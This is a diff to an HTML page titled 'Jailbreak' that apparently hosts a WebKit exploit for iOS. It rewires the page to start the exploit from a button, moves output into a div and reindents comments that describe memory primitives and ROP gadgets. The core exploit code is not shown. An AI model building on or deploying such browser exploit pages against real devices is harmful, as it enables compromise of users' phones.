@@ -9,6 +9,11 @@
 <title>Jailbreak</title>
 
 <body>
+<div id="textDiv" >
+</div>
+<div>
+    <button type="button" onclick="exploitNew()">Start exploit</button>
+</div>
 </body>
 
 <script src="utils.js"></script>
@@ -16,7 +21,7 @@
     //var magic =  r32(base);
     //log('[+] Which has magic '+magic.toString(16));
     let alert1 = function (msg) {
-        document.body.innerText += msg + '\n';
+        document.getElementById("textDiv").innerText += msg + '\n';
     }
 
     function dec2hex(n) {
@@ -87,15 +92,14 @@
     //tmp = base;
     //var hdr = Add(0x180000000,slide);
     // log(hdr + hdr1)
-    let count = 1;
     /*
-     * This code is taken from a GitHub user that I sadly forgot the name of.
-     * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
-     * Rumours are that it has been patched after iOS 13 beta 2.
-     * Exploit primitives are gained eventually using Linus Henze's method with WebAssembly.
-     * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
-     * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any codesignature requirements.
-    */
+         * This code is taken from a GitHub user that I sadly forgot the name of.
+         * The code exploits a vulnerability discovered in WebKit by Luca Todesco.
+         * Rumours are that it has been patched after iOS 13 beta 2.
+         * Exploit primitives are gained eventually using Linus Henze's method with WebAssembly.
+         * It is under no circumstance justified to alter or reuse the code for the harm of innocent users or counter-intelligence.
+         * The purpose of this exploit is to demonstrate the impact of zero- and one-click exploits and to run mach_swap without any code signature requirements.
+        */
     var FPO = typeof (SharedArrayBuffer) === 'undefined' ? 0x18 : 0x10;
     var VM_PROT_NONE = 0x0
     var VM_PROT_READ = 0x1
@@ -975,6 +979,7 @@
                 //came back 2 days later to write my own ROP Gadgets ;)
                 //one dylib to ROP them all... "/usr/lib/PN548.dylib"
                 //TODO:lib #658 /usr/lib/PN548.dylib @ 0x000000016b58e000
+                //TODO:PN548 is a NFC Module
                 //memory.writeInt64(exe_ptr,0x0,Add(0x1883c0d4c,cache_slide))
                 //d.addEventListener('click', function(){})
                 //writeInt64 is defined as (where,offset,what)
@@ -1196,10 +1201,11 @@
         }
     }
 
-    exploit();
+    function exploitNew(){
+        document.getElementById("textDiv").innerText='';
+        exploit();
+    };
 
 </script>
-<div>
-    <button type="button" onclick="exploit()">Start exploit</button>
-</div>
+
 </html>
